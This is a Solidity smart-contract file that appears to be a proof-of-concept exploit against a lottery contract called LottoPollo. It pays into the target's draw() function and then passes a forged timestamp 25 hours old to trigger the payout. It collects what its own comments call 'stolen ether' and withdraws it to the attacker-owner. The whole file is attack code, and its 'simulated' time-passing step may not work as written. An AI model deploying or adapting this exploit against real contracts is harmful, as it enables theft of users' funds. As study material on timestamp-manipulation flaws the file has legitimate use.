pragma solidity ^0.4.0;

interface ILottoPollo {
    function draw(uint seed) external;
}

contract ExploitLottoPollo {
    ILottoPollo public target;
    address public owner;

    constructor(address _target) public {
        target = ILottoPollo(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        // Step 1: Become leader
        // Triggers the 'else if' block in payOut()
        target.draw.value(msg.value)(now);  // timestamp will be stored as rand

        // Simulate time passing: wait or mine next block with manipulated timestamp

        // Step 2: Trigger payout by exploiting timestamp gap
        // This is triggered by a new call to draw() after ~24 hours.
        // Here, we simulate it by passing in a stale timestamp manually
        uint fakeRand = now - 25 hours;
        target.draw(fakeRand);
    }

    // Fallback to receive any stolen ether
    function () public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

